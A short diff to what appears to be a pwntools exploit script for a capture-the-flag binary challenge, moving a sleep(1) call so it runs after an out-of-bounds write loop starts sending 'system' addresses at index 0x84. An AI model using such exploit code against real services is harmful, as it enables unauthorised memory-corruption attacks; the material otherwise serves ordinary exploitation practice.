@@ -246,7 +246,6 @@ def write(idx, addr):
     io.sendline(b'3')
     io.sendlineafter(b'change:', str(idx))
     io.sendlineafter(b'number:', str(addr))
-    sleep(1)
 
 def oob():
     io.recvuntil('have:')
@@ -259,6 +258,7 @@ def oob():
     idx = 0x84
 
     info("Sending payload")
+    sleep(1)
 
     for addr in system:
         write(idx, addr)
